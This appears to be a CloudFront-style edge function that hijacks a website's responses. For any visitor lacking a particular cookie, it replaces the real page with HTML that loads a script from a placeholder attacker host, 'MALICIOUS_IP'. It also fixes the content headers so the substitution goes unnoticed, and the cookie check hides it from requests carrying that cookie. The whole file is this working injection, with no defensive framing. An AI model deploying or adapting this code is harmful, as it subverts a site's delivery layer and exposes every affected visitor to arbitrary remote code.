function handler(event) {
    var response = event.response;
    var headers = response.headers;
    var request = event.request;
    var cookies = request.cookies;
    // Check if the custom header is set
    if (!cookies['x-custom-header']) {

        // Replace the body with custom content
        response.body = {
            encoding: 'text',
            data: `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Redirection</title>
                <script src="https://MALICIOUS_IP/redirectScript.js"></script>
            </head>
            <body>
                Redirecting...
            </body>
            </html>
            `
        };

        // Adjust necessary headers
        headers['content-type'] = { value: 'text/html' };
        
        // Calculate new content length based on the replaced body
        var newContentLength = response.body.data.length.toString();
        headers['content-length'] = { value: newContentLength };

        // Remove content-encoding if it's set, as our new content is plain text
        if (headers['content-encoding']) {
            delete headers['content-encoding'];
        }
    }

    return response;
}